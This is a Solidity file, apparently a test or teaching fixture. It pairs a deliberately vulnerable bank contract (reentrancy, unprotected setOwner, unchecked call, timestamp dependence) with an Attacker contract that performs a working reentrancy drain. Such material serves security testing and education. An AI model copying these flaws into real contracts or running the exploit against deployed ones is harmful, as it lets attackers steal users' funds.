// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vulnerable Bank Contract
 * @notice ⚠️ THIS CONTRACT HAS INTENTIONAL VULNERABILITIES FOR TESTING
 * @dev DO NOT USE IN PRODUCTION
 *
 * Known Vulnerabilities:
 * 1. SC01 - Reentrancy in withdraw()
 * 2. SC02 - Missing access control in setOwner()
 * 3. SC04 - Unchecked call return value
 * 4. SC08 - Timestamp dependence in isLucky()
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    address public owner;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Deposit funds into the bank
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit positive amount");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw funds from the bank
     * @dev VULNERABLE TO REENTRANCY (SC01)
     * External call before state update allows reentrancy
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // VULNERABILITY: External call before state change
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // State change AFTER external call - reentrancy possible
        balances[msg.sender] = 0;

        emit Withdrawal(msg.sender, balance);
    }

    /**
     * @notice Change contract owner
     * @dev VULNERABLE: MISSING ACCESS CONTROL (SC02)
     * Anyone can call this function and become owner
     */
    function setOwner(address newOwner) public {
        // VULNERABILITY: No onlyOwner modifier
        owner = newOwner;
    }

    /**
     * @notice Emergency withdrawal by owner
     * @dev VULNERABLE: UNCHECKED CALL RETURN VALUE (SC04)
     */
    function emergencyWithdraw(address payable recipient, uint256 amount) public {
        require(msg.sender == owner, "Only owner");

        // VULNERABILITY: Return value not checked
        recipient.call{value: amount}("");
    }

    /**
     * @notice Check if current timestamp is "lucky"
     * @dev VULNERABLE: TIMESTAMP DEPENDENCE (SC08)
     * Miners can manipulate block.timestamp within ~15 seconds
     */
    function isLucky() public view returns (bool) {
        // VULNERABILITY: Using block.timestamp for critical logic
        return block.timestamp % 7 == 0;
    }

    /**
     * @notice Get balance of user
     */
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }

    /**
     * @notice Get contract total balance
     */
    function getTotalBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        deposit();
    }
}

/**
 * @title Attacker Contract
 * @notice Demonstrates reentrancy attack
 */
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    /**
     * @notice Start reentrancy attack
     */
    function attack() public payable {
        require(msg.value > 0, "Need funds to attack");

        // Deposit to bank
        bank.deposit{value: msg.value}();

        // Trigger reentrancy
        bank.withdraw();
    }

    /**
     * @notice Fallback function to perform reentrancy
     */
    receive() external payable {
        // Reenter if bank still has funds
        if (address(bank).balance > 0 && attackCount < 3) {
            attackCount++;
            bank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
